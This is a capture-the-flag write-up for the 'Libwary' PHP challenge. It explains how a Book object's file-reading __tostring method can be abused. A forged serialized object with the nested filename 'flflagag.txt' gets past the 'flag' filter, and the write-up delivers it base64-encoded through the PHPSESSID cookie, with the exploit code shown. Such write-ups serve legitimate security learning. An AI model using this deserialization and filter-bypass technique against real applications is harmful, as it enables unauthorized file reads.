# Libwary

Author: reyes

> Try to read the flag from The Libwary. (Impossible)

**Difficulty: Medium**

## Solution
When you choose a book and submit your choice, a new object `Book` is constructed.  

Then, when our object is echoed, the `__tostring` method is implicitly called, which reads the actual file, and for a final defence, if `flag` is in the filename and it is not `fakeflag.txt`, the filename is filtered.

We notice that we have no control over the `Book` object, so we can only exploit through the `PHPSESSID` cookie which is expected to be a `User` objet.

```php
<?php
include("util.php");
$exploit = new Book(5);
$exploit->name = "flflagag.txt";
echo base64_encode(serialize($exploit));
?>
```
